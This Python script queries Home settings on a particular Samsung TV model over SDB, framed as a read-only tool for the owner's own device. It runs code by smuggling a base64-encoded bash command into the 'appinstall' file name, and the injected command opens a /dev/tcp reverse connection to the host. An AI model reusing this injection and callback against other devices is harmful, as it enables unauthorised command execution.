"""Read-only native Home query for the tested S95B firmware.

Adapted from chaosmanage/samsung-tv-launcher scripts/native-home/run.py
(MIT, Nathan Clark). This is an undocumented SDB transport. It stages a
read-only shell or managed probe on the TV; neither updates a Home preference.
This stages temporary files on the TV.
"""

import base64
import json
import os
from pathlib import Path
import socket
import subprocess
import sys
import urllib.request
import uuid


ROOT = Path(__file__).resolve().parent
PRIVATE = ROOT / "private"
TV_IP = os.environ.get("TV_IP", "")
TV_MODEL = "QE55S95BATXXH"
SERIAL = TV_IP + ":26101"
SDB = Path(os.environ.get("SDB_PATH", r"C:\tizen-studio\tools\sdb.exe"))


def checked_run(args, timeout=30):
    result = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
    if result.returncode:
        raise RuntimeError(f"Command failed: {result.stderr[-500:]} {result.stdout[-500:]}")
    return result


def require_exact_model():
    with urllib.request.urlopen(f"http://{TV_IP}:8001/api/v2/", timeout=5) as response:
        info = json.load(response)
    model = info.get("device", {}).get("modelName")
    if model != TV_MODEL:
        raise RuntimeError(f"Model guard stopped: got {model!r}, expected {TV_MODEL!r}")


def main():
    mode = "query" if len(sys.argv) == 1 else sys.argv[1]
    if mode not in ("query", "verify") or len(sys.argv) > 2:
        raise SystemExit("Use: python query.py [query|verify]")
    if not TV_IP:
        raise RuntimeError("Set TV_IP to your TV's local IP address")
    if not SDB.is_file():
        raise RuntimeError(f"SDB executable missing: {SDB}")
    require_exact_model()
    checked_run([str(SDB), "connect", SERIAL])

    token = uuid.uuid4().hex[:12]
    if mode in ("query", "verify"):
        assembly = "LumaHomeQuery" if mode == "query" else "LumaHomeControl"
        directory = "query" if mode == "query" else "control"
        for suffix in ("dll", "runtimeconfig.json", "deps.json"):
            source = ROOT / "out" / directory / f"{assembly}.{suffix}"
            if not source.is_file():
                raise RuntimeError(f"Compiled read-only helper missing: {source}")
            destination = "/home/owner/share/tmp/sdk_tools/" + source.name
            checked_run([str(SDB), "-s", SERIAL, "push", str(source), destination])
    if mode == "verify":
        baseline = PRIVATE / "original.json"
        if not baseline.is_file():
            raise RuntimeError("Saved original baseline missing")
        checked_run([str(SDB), "-s", SERIAL, "push", str(baseline),
                     "/home/owner/share/tmp/sdk_tools/LumaHomeOriginal.json"])
    remote = f"/home/owner/share/tmp/sdk_tools/luma-{mode}-{token}.sh"
    probe = (ROOT / f"{mode}.sh").read_bytes().replace(b"\r\n", b"\n").replace(b"\r", b"\n")
    PRIVATE.mkdir(exist_ok=True)
    staged = PRIVATE / f"{mode}-{token}.sh"
    staged.write_bytes(probe)
    checked_run([str(SDB), "-s", SERIAL, "push", str(staged), remote])

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as route:
        route.connect((TV_IP, 9))
        host_ip = route.getsockname()[0]
    with socket.socket() as listener:
        listener.bind((host_ip, 0))
        listener.listen(1)
        listener.settimeout(18)
        port = listener.getsockname()[1]
        callback = f"exec 3<>/dev/tcp/{host_ip}/{port};cat {remote}|bash >&3 2>&3;exec 3>&-"
        script = f"/bin/mkdir /tmp/luma-{token} 2>/dev/null&&{{ {callback};}}"
        encoded = base64.b64encode(script.encode()).decode()
        name = "new2.tpk`printf${IFS}%s${IFS}" + encoded + "|base64${IFS}-d|bash`.tpk"
        argument = "0 appinstall tpk " + name
        if len(argument.encode()) > 400:
            raise RuntimeError("Reviewed SDB transport size exceeded")
        process = subprocess.Popen(
            [str(SDB), "-s", SERIAL, "shell", argument],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        try:
            conn, peer = listener.accept()
            if peer[0] != TV_IP:
                raise RuntimeError("Unexpected callback peer")
            data = bytearray()
            with conn:
                conn.settimeout(8)
                while True:
                    chunk = conn.recv(65536)
                    if not chunk:
                        break
                    data.extend(chunk)
                    if len(data) > 100_000:
                        raise RuntimeError("Inspection output exceeds limit")
            output = data.decode(errors="replace")
            markers = {
                "query": ("LUMA_QUERY_TRANSPORT_BEGIN", "LUMA_QUERY_TRANSPORT_END"),
                "verify": ("LUMA_VERIFY_BEGIN", "LUMA_VERIFY_END"),
            }
            begin, end = markers[mode]
            (PRIVATE / f"{mode}-output.txt").write_text(output, encoding="utf-8")
            if begin not in output or end not in output:
                raise RuntimeError("Incomplete inspection; see private output. No native setting was changed")
            print(output)
        finally:
            if process.poll() is None:
                process.terminate()
            process.communicate(timeout=8)


if __name__ == "__main__":
    main()
